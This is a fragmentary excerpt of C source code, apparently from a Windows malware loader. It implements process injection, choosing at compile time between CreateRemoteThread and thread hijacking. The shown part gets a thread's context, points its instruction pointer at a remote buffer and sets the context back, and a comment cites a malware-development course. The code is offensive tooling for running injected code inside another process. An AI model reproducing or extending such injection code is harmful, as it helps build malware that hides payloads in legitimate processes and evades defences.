...
// Various techs for creating remote threads
#define INJECTION_TYPE_CreateRemoteThread (0)
#define INJECTION_TYPE_ThreadHijack (1)
#define INJECTION_TYPE (INJECTION_TYPE_ThreadHijack)
...
#if INJECTION_TYPE == INJECTION_TYPE_CreateRemoteThread
    IMPORT_FUNC(kernel32, CreateRemoteThread);
#endif
#if INJECTION_TYPE == INJECTION_TYPE_ThreadHijack
    IMPORT_FUNC(kernel32, GetThreadContext);
    IMPORT_FUNC(kernel32, SetThreadContext);
    IMPORT_FUNC(kernel32, ResumeThread);
...
#if INJECTION_TYPE == INJECTION_TYPE_ThreadHijack
    // Hijack the thread - https://maldevacademy.com/modules/36?all_modules=1&view=blocks
    HANDLE hThread = pi.hThread;
    CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		LOG("GetThreadContext failed: %ld", GetLastError());
		return;
	}
    LOG("SetThreadContext -> adjusting RIP");
    ThreadCtx.Rip = (DWORD64)remote_buf;
    if (!SetThreadContext(hThread, &ThreadCtx)) {
		LOG("SetThreadContext failed: %ld", GetLastError());
		return;
	}
